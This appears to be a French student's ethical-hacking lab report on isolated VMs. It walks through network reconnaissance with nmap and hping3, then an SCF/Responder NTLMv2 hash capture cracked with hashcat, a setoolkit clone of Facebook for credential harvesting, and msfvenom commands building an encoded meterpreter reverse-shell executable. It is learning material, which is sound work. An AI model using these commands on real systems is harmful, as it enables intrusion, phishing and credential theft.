---
title: PROJET
description: Projet d'etical hacking de fin d'année
---

## Introduction

### Les chiffres

- Hammeconnage augmente de 50% year-on-year
- Piratage de compte +97.5%
- En 2023, la cybercriminalité rapporte plus que le narcotraffic

### La nomenclature

- Whitehat: Aide ses victimes a améliorer leur sécurité. Dégêts limités. 
- Blackhat: Intention de nuire, motivation principalement criminelle.
- Greyhat: A priori gentil mais noob qui peut faire des dégêts par inadvertance.
- Redhat: Chasseur de blackhat, principalement de la police. 
- Hacktiviste: Motivé par une idéologie. 
- Script kiddie: Noob.

---

- Malware: Tout type de logiciel malveillant.
    - Backdoor: Donne la main a l'attaquant de facon rapide une fois son attaque initiale terminée.
    - Credential stealer: Vole des identifiants.
    - Downloader: Télécharge quelque chose sur le PC de la victime
    - Dropper: Installe et lance un exécutable.
    - Launcher: Lance un exécutable.
    - Ransomware: Chiffre le disque.
    - Virus: se propage.
    - Trojan: Semble légitime. 
    - Rootkit: Elevation de privilèges en dissimulangt sa présence. Modifie le kernel. 
    - Bootkit: Fonctionne au démarrage, avant le système.
    - Botnet: Réseau d'ordinateurs infectés par le même malware. Utilisé pour des attaques de masse. 
    - Worm: Utilise les comms réseau de la machine pour se propager. 

---

La Cyber kill chain décrit les phases d'une cyberattaque, de la reconnaissance à l'exfiltration de données.

- Reconnaissance
    - Recon passive: Pas de contact avec la cible (réseaux sociaux et autres informations disponibles publiquement)
    - Recon active: Interrogatio  directe de la cible
- Armement: Création des malwares avec les informations obtenues
- Livraison: Transmission de l'arme à la cible
- Actions sur l'objectif: Actions qui permettent d'atteindre l'objectif de l'attaquant. 
- Intsallation: Création d'un backdoor
- Command & contol: Accès interactif direct à la cible 

---

- Groupe APT: Advanced Persistant Threat. 
    C'est un groupe qualifié avec un objectif. Potentiellement un gouvenrement. 
- Social engineering: Exploitation du comportement humain.
- OSINT SOCMINT: Open Source INTelligence. Récupération d'informartion légales. 
- Doxxing


### Actualités

### Veille

Permet de se tenir a jour sur les actualités et outils.

- OpenCVE [https://cvetrends.com/](https://cvetrends.com/)

## Techniques de hacking

### Rappel

- Reconnaissance active / passive
    - Bien documenter, on serait cramés si on recommence. 
- Evaluation
    - Evaluation des faiblesses de la cible
    - Classification des vulnérabilités
    - Cartographie (détection de passages horizontaux possibles)
    - Documentation des découvertes
- Exploitation
    - Vérification des accès et informations accessibles grâce aux vulnérabilités fortes
    - Attaque manuelle ou automatique
    - Obtention d'un accès, capture des informations sensibles, doculentation
- Escalade des privilèges verticaux / horizontaux
    - Obtention de privilèges supérieurs
    - Découverte d'informations supplémentaires sur le compte user
    - Accès à d'autres systèmes avec les privilèges ibtenus
    - Documentation
- Maintien de l'accès
    - Création d'un compte privilégié par ex
    - Réparation des dégâts occasionnés par l'infiltration
    - Injection de fausses données pour brouiller ses pistes

#### Réseaux

!!! warning "Je dormais chez moi"

#### Linux

### Reconnaissance passive

### Reconnaissance active

### Evaluation de vulnérabilité

Les scanners de vulnérabilités détectgent les versions des logiciels sur le système et cherchent des vulnérabilités connues qui leur sont associés. 

- Nessus
- Metasploit
- Combinaison Nessus/Metasploit
- OpenVAS (un peu moins efficace)
- Nmap

Les scanners sont très efficaces pour l'audit, mais très bruillants donc inadaptés au redteam. 
Il y a aussi beaucoup de faux positifs/négatifs. 

### Metasploit

### MIM

### Bruteforce

## Contre-mesures

### Normes et référentiels

### Définitions

### Technique

---

## Mardi

- Config réseau classique sur les 3 machines
- `for addr in $(seq 1 254); do arping 192.168.2.$addr -c 1 | grep "bytes from" | cut -d " " -f 5 | cut -d "(" -f 2 | cut -d ")" -f 1 >> liste.txt & done`
- `netdiscover -p`

## PROJET

!!! info "Exécution en root"
    Puisque nous travaillons sur des VMs hors production, je fais tout en root par facilité. 

!!! info "Windows Firewall"
    J'ai désactivé le Windows Firewall pour que la machine soit plus exploitable. 

!!! note "Résultats des commandes"
    J'ai tronqué certains résultats pour augmenter la lisibilité du rapport, par exemple en enlevant la verbosité excessive qui donne des informations qui ne nous concerne pas ou les lignes qui sont redondantes.

### Premier TP

#### Configuration réseau

```sh title="/etc/network/interfaces" 
auto eth0
iface eth0 inet static
address 192.168.10.10 
# .20 pour Metasploit et .30 pour Windows
netmask 255.255.255.0
```

On redémare le service de networking puis on vérifie la configuration réseau:

```bash
systemctl restart networking
ip a
```

#### Phase passive

##### arping

Description de la commande:

- On exécute la commande dans une boucle pour toutes les addresses allant de 1 à 254
- On utilise `-c` pour spécifier qu'on n'envoie qu'un paquet par requête
- On utilise `-i` pour spécifier l'interface a utiliser (sinon on recoit beaucoup d'alertes, la commande étant déjà très verbeuse de base)
- Dans le résultat, on cherche les lignes qui correspondent à une réponse positives grâce a grep. Elles contiennent toutes "bytres from"
- Avec cut, nous sélectionnons la partie de la réponse qui contient l'IP en découpant la ligne avec le caractère ++space++
- Avec tr, on supprime les caractères innutiles
- On envoie la sortie vers le fichier `IpList`

La commande optimisée a alors cette forme:

```bash
for addr in $(seq 1 254); do arping 192.168.10.$addr -c 1 -i eth0 | grep "bytes from" |  cut -d' ' -f5 | tr -d "():" >> IpList & done
```

Le fichier `IpList` prend alors le contenu suivant:

```title="IpList" linenums="1"
```

!!! note "Architecture réseau"
    Bien que j'ai fait la suite des exercice en réseau, j'ai recommencé sur un réseau virtuel avec seulement mes machines par soucis d'efficacité et de propreté.

##### netdiscover

On teste netdiscover:

```
netdiscver -i eth0
```
```
Currently scanning: 172.16.105.0/16   |   Screen View: Unique Hosts                                                           
                                                                                                                               
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.10.20   00:0c:29:6a:b4:8b      1      60  VMware, Inc.                                                                
 192.168.10.30   00:0c:29:b1:ce:95      1      60  VMware, Inc.    
```

##### hping

Description de la commande: 

- On exécute la commande dans une boucle pour toutes les addresses allant de 1 à 254
- On utilise `--icmp` pour spécifier le protocole a utiliser
- On utilise `-c` pour spécifier qu'on n'envoie qu'un paquet ar requête
- On cherche les résultats positifs grâce a grep. Les résultats positifs spécifient la longueur avec `len=`
- Comme pour arping, on utilise `cut` et `tr` pour isoler l'IP du résultat
- On envoie la sortie vers IpList2

La commande optimisée a alors cette forme:

```bash
for addr in $(seq 1 254); do hping3 192.168.10.$addr --icmp -c 1 | grep "len=" | cut -d' ' -f2 | tr -d "ip=" >> IpList2 & done
```

Le fichier IpList2 prend alors le contenu suivant:

```title="IpList2" linenums="1"
192.168.10.20
192.168.10.30
```

#### Phase active - couche 4

##### nmap

Test UDP de toutes les adresses avec tous les ports de 1 à 100:

```
nmap 192.168.10.1-254 -sU -p 1-100
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 05:32 EDT
Stats: 0:00:16 elapsed; 251 hosts completed (2 up), 253 undergoing Host Discovery
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 192.168.10.20
Host is up (0.00045s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT   STATE         SERVICE
53/udp open          domain
69/udp open|filtered tftp
MAC Address: 00:0C:29:6A:B4:8B (VMware)

Nmap scan report for 192.168.10.30
Host is up (0.0010s latency).
All 100 scanned ports on 192.168.10.30 are in ignored states.
Not shown: 100 closed udp ports (port-unreach)
MAC Address: 00:0C:29:B1:CE:95 (VMware)

Nmap scan report for 192.168.10.10
Host is up (0.0000030s latency).
All 100 scanned ports on 192.168.10.10 are in ignored states.
Not shown: 100 closed udp ports (port-unreach)

Nmap done: 254 IP addresses (3 hosts up) scanned in 136.01 seconds
```

Test SYN des adresses renseignées dans IpList avec tous les ports:

```
nmap -sS -iL IpList -p 0-65535
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 05:40 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 2 undergoing ARP Ping Scan
Parallel DNS resolution of 2 hosts. Timing: About 0.00% done
Nmap scan report for 192.168.10.20
Host is up (0.0030s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  ircs-u
8009/tcp  open  ajp13
8180/tcp  open  unknown
8787/tcp  open  msgsrvr
41869/tcp open  unknown
44167/tcp open  unknown
44522/tcp open  unknown
51807/tcp open  unknown
MAC Address: 00:0C:29:6A:B4:8B (VMware)

Nmap scan report for 192.168.10.30
Host is up (0.00084s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49187/tcp open  unknown
MAC Address: 00:0C:29:B1:CE:95 (VMware)

Nmap done: 2 IP addresses (2 hosts up) scanned in 36.01 seconds
```

Test de connexion TCP sur le port 80:

```
nmap -sT -iL IpList -p 80
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 05:48 EDT
Nmap scan report for 192.168.10.20
Host is up (0.00023s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:6A:B4:8B (VMware)

Nmap scan report for 192.168.10.30
Host is up (0.00032s latency).

PORT   STATE  SERVICE
80/tcp closed http
MAC Address: 00:0C:29:B1:CE:95 (VMware)

Nmap done: 2 IP addresses (2 hosts up) scanned in 13.11 seconds
```

##### hping3

Test de plusieurs ports avec SYN:

```
hping3 192.168.10.20 --scan 21,80,443 -S -V
```
```
using eth0, addr: 192.168.10.10, MTU: 1500
Scanning 192.168.10.20 (192.168.10.20), port 21,80,443
3 ports to scan, use -V to see all the replies
+----+-----------+---------+---+-----+-----+-----+
|port| serv name |  flags  |ttl| id  | win | len |
+----+-----------+---------+---+-----+-----+-----+
   21 ftp        : .S..A...  64     0  5840    46
   80 http       : .S..A...  64     0  5840    46
  443 https      : ..R.A...  64     0     0    46
All replies received. Done.
Not responding ports: 
```

Ajout de la vérification d'ID relative:

```
hping3 -S -r 192.168.10.20
```
```
HPING 192.168.10.20 (eth0 192.168.10.20): S set, 40 headers + 0 data bytes
len=46 ip=192.168.10.20 ttl=64 DF id=0 sport=0 flags=RA seq=0 win=0 rtt=7.8 ms
len=46 ip=192.168.10.20 ttl=64 DF id=+0 sport=0 flags=RA seq=1 win=0 rtt=3.4 ms
len=46 ip=192.168.10.20 ttl=64 DF id=+0 sport=0 flags=RA seq=2 win=0 rtt=7.1 ms
len=46 ip=192.168.10.20 ttl=64 DF id=+0 sport=0 flags=RA seq=3 win=0 rtt=7.0 ms
^C
--- 192.168.10.20 hping statistic ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 3.4/6.3/7.8 ms
```
```
hping3 -S -r 192.168.10.30
```
```
PING 192.168.10.30 (eth0 192.168.10.30): S set, 40 headers + 0 data bytes
len=46 ip=192.168.10.30 ttl=128 DF id=896 sport=0 flags=RA seq=0 win=0 rtt=3.7 ms
len=46 ip=192.168.10.30 ttl=128 DF id=+1 sport=0 flags=RA seq=1 win=0 rtt=6.5 ms
len=46 ip=192.168.10.30 ttl=128 DF id=+1 sport=0 flags=RA seq=2 win=0 rtt=3.3 ms
len=46 ip=192.168.10.30 ttl=128 DF id=+1 sport=0 flags=RA seq=3 win=0 rtt=2.7 ms
^C
--- 192.168.10.30 hping statistic ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 2.7/4.1/6.5 ms
```

La machie Windows a une ID incrémentée, signifiant une potentielle exploitation possible en tant que relais pour nmap. 

##### dmitry

```
dmitry -p 192.168.10.20
```
```
Deepmagic Information Gathering Tool
"There be some deep magic going on"

ERROR: Unable to locate Host Name for 192.168.10.20
Continuing with limited modules
HostIP:192.168.10.20
HostName:

Gathered TCP Port information for 192.168.10.20
---------------------------------

 Port           State

21/tcp          open
22/tcp          open
23/tcp          open
25/tcp          open
53/tcp          open
80/tcp          open
111/tcp         open
139/tcp         open

Portscan Finished: Scanned 150 ports, 141 ports were in state closed


All scans completed, exiting
```

##### Test nmap zombie

Utilisation de la machine Windows pour effectuer un scan nmap:

```
nmap -sI 192.168.10.30 192.168.10.20
```
```
WARNING: Many people use -Pn w/Idlescan to prevent pings from their true IP.  On the other hand, timing info Nmap gains from pings can allow for faster, more reliable scans.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 06:11 EDT
Idle scan using zombie 192.168.10.30 (192.168.10.30:443); Class: Incremental
Nmap scan report for 192.168.10.20
Host is up (0.051s latency).
Not shown: 978 closed|filtered tcp ports (no-ipid-change)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:6A:B4:8B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 33.98 seconds
```

#### Phase active - prise d'empreintes

##### netcat

```
nc -vn 192.168.10.20 22
```
```
(UNKNOWN) [192.168.10.20] 22 (ssh) open
SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

Protocol mismatch.
```

Vérification des vulnérabilités sur [CVEdetails.com](https://www.cvedetails.com/vulnerability-list/vendor_id-97/product_id-585/version_id-430455/Openbsd-Openssh-4.7p1.html?page=1&order=1&trc=33&sha=8a498c9f91a4fda2a49f7ca691d7c2e3cd6e210c).


##### dmitry

```
dmitry -bp 192.168.10.20
```
```
Deepmagic Information Gathering Tool
"There be some deep magic going on"

ERROR: Unable to locate Host Name for 192.168.10.20
Continuing with limited modules
HostIP:192.168.10.20
HostName:

Gathered TCP Port information for 192.168.10.20
---------------------------------

 Port           State

21/tcp          open
>> 220 (vsFTPd 2.3.4)

22/tcp          open
>> SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1

23/tcp          open
>> ��▒�� ��#��'
25/tcp          open
>> 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)

53/tcp          open

Portscan Finished: Scanned 150 ports, 144 ports were in state closed


All scans completed, exiting
```

##### nmap

```
nmap 192.168.10.20 -O
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 06:34 EDT
Nmap scan report for 192.168.10.20
Host is up (0.00099s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
MAC Address: 00:0C:29:6A:B4:8B (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
```

### TP nmap

Test des en-têtes HTTP:

```
nmap -sV --script http-headers 192.168.10.20 -p 80
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 11:37 EDT
Stats: 0:00:10 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 192.168.10.20
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
| http-headers: 
|   Date: Sun, 16 Jun 2024 03:47:04 GMT
|   Server: Apache/2.2.8 (Ubuntu) DAV/2
|   X-Powered-By: PHP/5.2.4-2ubuntu5.10
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
MAC Address: 00:0C:29:6A:B4:8B (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds
```

Test des méthodes HTTP disponibles:

```
nmap --script http-methods.nse --script-args http-methods.retest=1 192.168.10.20 -n -p 80
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 11:46 EDT
Nmap scan report for 192.168.10.20
Host is up (0.00025s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS
|   Status Lines: 
|     HEAD: HTTP/1.1 200 OK
|     GET: HTTP/1.1 200 OK
|     OPTIONS: HTTP/1.1 200 OK
|_    POST: HTTP/1.1 200 OK
MAC Address: 00:0C:29:6A:B4:8B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

Test WannaCry :

```
nmap -sC -p 445 -max-hostgroup 3 -open --script smb-vuln-ms17-010.nse 192.168.10.20 -oX WannaCryTest.xml
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 11:49 EDT
Stats: 0:00:09 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for 192.168.10.20
Host is up (0.00037s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:0C:29:6A:B4:8B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds
```

### BDD Metasploit

```
nmap 192.168.10.20 -oX ScanNmap
systemctl start postgresql
msfdb init
msfconsole
db_status
workspace
workspace -a lab
db_import /home/kali/ScanNmap
hosts
db_nmap -A 192.168.10.30
db_export -f xml /home/kali/export.xml
```
```
use auxiliary/scanner/portscan/tcp
hosts -c address,os_flavor -S Linux -R
```
```

Hosts
=====

address  os_flavor
-------  ---------

[*] The list is empty, cowardly refusing to set RHOSTS
```
```
hosts -c address,os_flavor -S Unknown -R
```
```

Hosts
=====

address        os_flavor
-------        ---------
192.168.10.20

RHOSTS => 192.168.10.20
```
```
back
services 192.168.10.20 -c name,info -S http
```
```
Services
========

host           name          info
----           ----          ----
192.168.10.20  ftp
192.168.10.20  ssh
192.168.10.20  telnet
192.168.10.20  smtp
192.168.10.20  domain
192.168.10.20  http
192.168.10.20  rpcbind
192.168.10.20  netbios-ssn
192.168.10.20  microsoft-ds
192.168.10.20  exec
192.168.10.20  login
192.168.10.20  shell
192.168.10.20  rmiregistry
192.168.10.20  ingreslock
192.168.10.20  nfs
192.168.10.20  ccproxy-ftp
192.168.10.20  mysql
192.168.10.20
192.168.10.20  postgresql
192.168.10.20  vnc
192.168.10.20  x11
192.168.10.20  irc
192.168.10.20
192.168.10.20  ajp13
192.168.10.20
192.168.10.20
```
```
use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set BLANK_PASSWORDS true
```
```

[+] 192.168.10.20:3306    - 192.168.10.20:3306 - Found remote MySQL version 5.0.51a
[-] 192.168.10.20:3306    - 192.168.10.20:3306 - LOGIN FAILED: root:mfsadmin (Unable to Connect: invalid packet: scramble_length(0) != length of scramble(21))
[-] 192.168.10.20:3306    - 192.168.10.20:3306 - LOGIN FAILED: root: (Unable to Connect: invalid packet: scramble_length(0) != length of scramble(21))
[*] Scanned 1 of 2 hosts (50% complete)
[-] 192.168.10.30:3306    - 192.168.10.30:3306 - Unable to connect: The connection was refused by the remote host (192.168.10.30:3306).
[*] Scanned 2 of 2 hosts (100% complete)
[*] Bruteforce completed, 1 credential was successful.
[*] You can open an MySQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
Aucun cred trouvé pour `root` ni `msfadmin` essayé juste après. 

### Windows SCF

```title="exploit.scf" linenums="1"
[Shell]
IconFile=\\192.168.10.10\icon
```
```
python2 -m SimpleHTTPServer 8000 
```

Une fois le serveur lancé, on se connecte sur [http://192.168.10.10:8000](http://192.168.10.10:8000) depuis Windows et on télécharge le fichier dans un dossier créé pour l'occasion. 
On lance ensuite responder et on ouvre le dossier sur Windows:

```
responder -I eth0
```
```
[SMB] NTLMv2-SSP Client   : 192.168.10.30
[SMB] NTLMv2-SSP Username : WIN-126H0VCFVDU\Tim
[SMB] NTLMv2-SSP Hash     : Tim::WIN-126H0VCFVDU:cb65fa760fe5fbef:0BA80200219C222FD5A3736BBF35ABF9:010100000000000080821379F7BFDA01E344449ED117476E00000000020008004D0044003300340001001E00570049004E002D00430053004B004600330047003300430030004F00480004003400570049004E002D00430053004B004600330047003300430030004F0048002E004D004400330034002E004C004F00430041004C00030014004D004400330034002E004C004F00430041004C00050014004D004400330034002E004C004F00430041004C000700080080821379F7BFDA01060004000200000008003000300000000000000001000000002000006685159A839C2ACC22F35F70AB9B65F96931EAE7C5A35BC142137E0BE8F8F4190A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310030002E0031003000000000000000000000000000                                                                                                     
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
[*] Skipping previously captured hash for WIN-126H0VCFVDU\Tim
```
```title="HashWindows" linenums="1"
Tim::WIN-126H0VCFVDU:cb65fa760fe5fbef:0BA80200219C222FD5A3736BBF35ABF9:010100000000000080821379F7BFDA01E344449ED117476E00000000020008004D0044003300340001001E00570049004E002D00430053004B004600330047003300430030004F00480004003400570049004E002D00430053004B004600330047003300430030004F0048002E004D004400330034002E004C004F00430041004C00030014004D004400330034002E004C004F00430041004C00050014004D004400330034002E004C004F00430041004C000700080080821379F7BFDA01060004000200000008003000300000000000000001000000002000006685159A839C2ACC22F35F70AB9B65F96931EAE7C5A35BC142137E0BE8F8F4190A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E00310030002E0031003000000000000000000000000000
```

Pour Hashcat, j'utilise le [dictionnaire de Karmaz95](https://github.com/Karmaz95/crimson_cracking/tree/main).
Je suis son README pour l'utiliser. 


```
hashcat HashWindows Downloads/crimson_cracking.txt -r Downloads/crimson_cracking.rule 
```

!!! failure "Pas assez de mémoire"
    J'alloue plus de mémoire a la machine.

```
Dictionary cache built:
* Filename..: Downloads/crimson_cracking.txt
* Passwords.: 1868722583
* Bytes.....: 20980904698
* Keyspace..: 147502010684560
* Runtime...: 1 min, 34 secs

TIM::WIN-126H0VCFVDU:cb65fa760fe5fbef:0ba80200219c222fd5a3736bbf35abf9:010100000000000080821379f7bfda01e344449ed117476e00000000020008004d0044003300340001001e00570049004e002d00430053004b004600330047003300430030004f00480004003400570049004e002d00430053004b004600330047003300430030004f0048002e004d004400330034002e004c004f00430041004c00030014004d004400330034002e004c004f00430041004c00050014004d004400330034002e004c004f00430041004c000700080080821379f7bfda01060004000200000008003000300000000000000001000000002000006685159a839c2acc22f35f70ab9b65f96931eae7c5a35bc142137e0be8f8f4190a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e00310030002e0031003000000000000000000000000000:1234
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TIM::WIN-126H0VCFVDU:cb65fa760fe5fbef:0ba80200219c2...000000
Time.Started.....: Sun Jun 16 15:29:43 2024 (0 secs)
Time.Estimated...: Sun Jun 16 15:29:43 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Downloads/crimson_cracking.txt)
Guess.Mod........: Rules (crimson_cracking.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   553.8 kH/s (8.14ms) @ Accel:48 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 24576/147502010684560 (0.00%)
Rejected.........: 0/24576 (0.00%)
Restore.Point....: 0/1868722580 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-64 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> ^*bond007
Hardware.Mon.#1..: Util: 13%
```

Le mot de passe a bien été craqué. 

### Social engineering

#### Scenario 1

```
msfconsole
use exploit/multi/fileformat/office_word_macro 
set payload windows/meterpreter/reverse_https
```

#### Scenario 2

```
mkdir phisherman
cd phisherman
git clone https://github.com/FDX100/Phisher-man.git
python3 app.py
```

Une fois l'interface web chargée, on suit les instructions du README: 

- "Clear Apache"
- "Start Apache Service"

Malhereusement, chaque choix qu'on peut sélectionner nous renvoie une 404  et la page web est redirigée vers un output de logs vide (voir captures ci-après). Il semblerait que la repo ne soit plus mise à jour depuis deux ans. 

#### Scenario 3

```
setoolkit
1
2
3
2
https://www.facebook.com
```
```
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: https://www.facebook.com

[*] Cloning the website: https://login.facebook.com/login.php                                                                                                                                                      
[*] This could take a little bit...                                                                                                                                                                                

The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                                           
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                                                                                                                                                                     
[*] Information will be displayed to you as it arrives below:                                                                                                                                                      
[*] Looks like the web_server can't bind to 80. Are you running Apache or NGINX?
Do you want to attempt to disable Apache? [y/n]: y
Stopping apache2 (via systemctl): apache2.service.
Stopping nginx (via systemctl): nginx.service.
[*] Successfully stopped Apache. Starting the credential harvester.
[*] Harvester is ready, have victim browse to your site.
```

L'attaque ne fonctionne pas, sans doute a cause de l'obsolescence du navigateur de Windows. 

```
192.168.10.30 - - [16/Jun/2024 18:48:40] "GET / HTTP/1.1" 200 -
192.168.10.30 - - [16/Jun/2024 18:48:42] "GET /favicon.ico HTTP/1.1" 404 -
```

On essaie a nouveau depuis Kali-même:

!!! warning "Ajouter image"

La sortie est très verbeuse, avec beaucoup de faux positifs, mais en cherchant on trouve le champs de login :

```
POSSIBLE USERNAME FIELD FOUND: email=didi@chandouidoui.com 
```

Malhersuement, le mot de passe reste introuvable, même après avoir lancé une recherche dans le fichier XML exporté. 

### Hack image

Création d'un shellcode:

```
msfvenom –p windows/Meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 LHOST=192.168.10.30 LPORT=4444 -f exe > virus.exe
```

!!! failure "msfvenom demande de spécifier une architecture"

```
msfvenom --help
```
```
msfvenom -a cmd –p windows/Meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 LHOST=192.168.10.30 LPORT=4444 -f exe > virus.exe
```

!!! failure "On doit également spécifier une plateforme"

```
msfvenom --list platforms
```
```
msfvenom --platform windows -a cmd –p windows/Meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 LHOST=192.168.10.30 LPORT=4444 -f exe > virus.exe
```
```
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai chosen with final size 81
Payload size: 81 bytes
Error: The payload could not be generated, check options
```

!!! failure "Toujours pas la bonne commande"
    On regarde la [doc officielle](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) pour affiner les options.

    !!! quote "How to generate a payload"

        To generate a payload, there are two flags that you must supply (-p and -f):

            The -p flag: Specifies what payload to generate

        To see what payloads are available from Framework, you can do:

            ./msfvenom -l payloads

        The -p flag also supports “-“ as a way to accept a custom payload:

            cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw

        The -f flag specifies the format of the payload

        Syntax example:

            ./msfvenom -p windows/meterpreter/bind_tcp -f exe

        To see what formats are supported, you can do the following to find out:

            ./msfvenom --help-formats

        Typically, this is probably how you will use msfvenom:

